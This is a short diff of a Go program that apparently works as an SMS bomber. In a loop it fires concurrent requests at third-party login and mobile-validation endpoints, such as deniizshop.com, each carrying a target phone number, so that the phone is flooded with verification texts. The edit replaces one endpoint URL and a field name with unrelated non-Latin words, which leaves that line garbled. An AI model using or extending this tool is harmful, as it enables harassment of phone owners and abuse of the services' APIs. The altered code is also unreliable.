@@ -99,7 +99,7 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
-		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
+		go sms("چیا زوله له چوی", map[string]interface{}{
 			"چیا له چوی": phone,
 		}, ch)
 		go sms("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{
